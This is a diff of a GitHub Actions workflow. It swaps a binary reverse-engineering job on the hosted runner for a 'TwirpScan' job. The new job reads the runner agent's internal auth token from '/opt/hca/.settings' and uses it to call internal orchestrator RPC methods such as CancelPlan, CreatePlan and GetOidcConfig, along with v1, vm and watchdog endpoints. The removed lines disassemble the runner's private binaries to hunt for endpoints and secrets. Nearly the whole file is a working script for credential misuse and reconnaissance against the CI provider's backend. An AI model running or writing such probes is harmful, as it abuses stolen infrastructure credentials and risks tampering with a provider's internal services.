@@ -1,53 +1,73 @@
-name: PrimerDeep
+name: TwirpScan
 on:
   workflow_dispatch:
 jobs:
   j:
     runs-on: ubuntu-latest
     steps:
-      - name: deep primer analysis
+      - name: twirp endpoint scan
         timeout-minutes: 5
         run: |
           set +e
-          echo === PRIMER GO SYMBOL TABLE ===
-          go tool objdump -S /opt/primer/primer 2>/dev/null | grep '^TEXT ' | head -100
+          JWT=$(python3 -c "import json; print(json.loads(open('/opt/hca/.settings','rb').read())['authToken'])")
+          BASE=$(python3 -c "import json; s=json.loads(open('/opt/hca/.settings','rb').read()); print(s['schedulerApiUrl'].replace('/v1',''))")
+          AUTH="Authorization: Bearer $JWT"
+          CT="Content-Type: application/json"
+          echo "Base: $BASE"
           echo
-          echo === GITHUB PRIVATE FUNCTIONS ===
-          go tool objdump /opt/primer/primer 2>/dev/null | grep '^TEXT github.com/github/' | sort -u | head -80
+          echo === TWIRP ON ORCHESTRATOR ===
+          SVC=github.actions.run_service.api.twirp.v1.RunService
+          for method in CancelPlan GetPlan GetConfiguration GetCallbacks GetOidcConfig GetTenantInfo GetAbuseInfo GetProperties GetContext GetGithubEventInfo GetTargetRepository GetBillingPlanOwner GetRerunContext CreatePlan; do
+            RESP=$(curl -s --max-time 5 -w '\nHTTP_%{http_code}' -X POST -H "$AUTH" -H "$CT" -d '{}' "$BASE/twirp/$SVC/$method" 2>&1)
+            CODE=$(echo "$RESP" | tail -1)
+            BODY=$(echo "$RESP" | head -5 | head -c 300)
+            echo "$method: $CODE $BODY"
+          done
           echo
-          echo === PRIMER PACKAGE FUNCTIONS ===
-          go tool objdump /opt/primer/primer 2>/dev/null | grep -iE '^TEXT.*(primer|hca|hosted|orchestr|agent|settings|config|auth|token|jwt|blob|diagnostic|watchdog)' | sort -u | head -80
+          echo === OTHER TWIRP SERVICES ===
+          for svc in github.actions.run_service.api.twirp.v1.OidcConfigService github.actions.run_service.api.twirp.v1.CallbacksService github.actions.run_service.api.twirp.v1.ConfigurationService; do
+            RESP=$(curl -s --max-time 5 -w '\nHTTP_%{http_code}' -X POST -H "$AUTH" -H "$CT" -d '{}' "$BASE/twirp/$svc/Get" 2>&1)
+            CODE=$(echo "$RESP" | tail -1)
+            BODY=$(echo "$RESP" | head -3 | head -c 200)
+            echo "$svc/Get: $CODE $BODY"
+          done
           echo
-          echo === URL AND API STRINGS ===
-          strings /opt/primer/primer | grep -iE '(https?://|/v1/|/api/|/vm/|githubapp|orchestrator|watchdog|diagnostics|blob\.core)' | sort -u | head -60
+          echo === V1 ENDPOINTS ===
+          for ep in request trace heartbeat cancel finish start notify config settings status health ready alive version info metrics; do
+            RESP=$(curl -s --max-time 3 -w '\nHTTP_%{http_code}' -X POST -H "$AUTH" -H "$CT" -d '{}' "$BASE/v1/$ep" 2>&1)
+            CODE=$(echo "$RESP" | tail -1)
+            BODY=$(echo "$RESP" | head -3 | head -c 200)
+            echo "POST /v1/$ep: $CODE $BODY"
+          done
           echo
-          echo === CONFIG ENVVARS ===
-          strings /opt/primer/primer | grep -E '^[A-Z_]{3,}$' | sort -u | head -40
-          strings /opt/primer/primer | grep -iE 'envconfig:|default:' | sort -u | head -40
+          echo === V1 GET ENDPOINTS ===
+          for ep in request trace heartbeat cancel status health ready alive version info metrics config; do
+            RESP=$(curl -s --max-time 3 -w '\nHTTP_%{http_code}' -H "$AUTH" "$BASE/v1/$ep" 2>&1)
+            CODE=$(echo "$RESP" | tail -1)
+            BODY=$(echo "$RESP" | head -3 | head -c 200)
+            echo "GET /v1/$ep: $CODE $BODY"
+          done
           echo
-          echo === PROTO SERVICES ===
-          strings /opt/primer/primer | grep -iE '(proto|twirp|grpc)' | grep -iE '(service|method|package|rpc)' | sort -u | head -30
-          strings /opt/primer/primer | grep -E '\.(proto|twirp)' | sort -u | head -30
+          echo === WATCHDOG ENDPOINTS ===
+          WATCHDOG=$(python3 -c "import json; print(json.loads(open('/opt/hca/.settings','rb').read()).get('watchdogTraceApiUrl',''))")
+          WBASE=$(echo $WATCHDOG | sed 's|/v1/trace||')
+          echo "Watchdog base: $WBASE"
+          for ep in trace health status config version info; do
+            RESP=$(curl -s --max-time 3 -w '\nHTTP_%{http_code}' -X POST -H "$AUTH" -H "$CT" -d '[]' "$WBASE/v1/$ep" 2>&1)
+            CODE=$(echo "$RESP" | tail -1)
+            BODY=$(echo "$RESP" | head -3 | head -c 200)
+            echo "watchdog /v1/$ep: $CODE $BODY"
+          done
           echo
-          echo === JSON STRUCT TAGS ===
-          strings /opt/primer/primer | grep -oE 'json:"[^"]+"' | sort -u | head -60
+          echo === VM V1 ENDPOINTS ===
+          for ep in request status config heartbeat cancel finish; do
+            RESP=$(curl -s --max-time 3 -w '\nHTTP_%{http_code}' -X POST -H "$AUTH" -H "$CT" -d '{}' "$BASE/vm/v1/$ep" 2>&1)
+            CODE=$(echo "$RESP" | tail -1)
+            BODY=$(echo "$RESP" | head -3 | head -c 200)
+            echo "POST /vm/v1/$ep: $CODE $BODY"
+          done
           echo
-          echo === YAML STRUCT TAGS ===
-          strings /opt/primer/primer | grep -oE 'yaml:"[^"]+"' | sort -u | head -40
-          echo
-          echo === ERROR MESSAGES ===
-          strings /opt/primer/primer | grep -iE '(failed to|error|unable to|cannot|could not)' | grep -ivE '(runtime|reflect|crypto|x509|tls|http2|unicode)' | sort -u | head -50
-          echo
-          echo === MAIN FUNCTIONS ===
-          go tool objdump /opt/primer/primer 2>/dev/null | grep '^TEXT main\.' | head -20
-          echo
-          echo === HCA BINARY GITHUB FUNCTIONS ===
-          go tool objdump /opt/hca/hosted-compute-agent 2>/dev/null | grep '^TEXT github.com/github/' | sort -u | head -80
-          echo
-          echo === HCA MAIN FUNCTIONS ===
-          go tool objdump /opt/hca/hosted-compute-agent 2>/dev/null | grep '^TEXT main\.' | head -20
-          echo
-          echo === HCA ERROR MESSAGES ===
-          strings /opt/hca/hosted-compute-agent | grep -iE '(failed to|error|unable to|cannot)' | grep -ivE '(runtime|reflect|crypto|x509|tls|http2|unicode)' | sort -u | head -50
+          echo === HCA SETTINGS FULL KEYS ===
+          python3 -c "import json; d=json.loads(open('/opt/hca/.settings','rb').read()); print('\n'.join(f'{k}: {str(v)[:80]}' for k,v in d.items() if k != 'authToken'))"
           echo
           echo === DONE ===
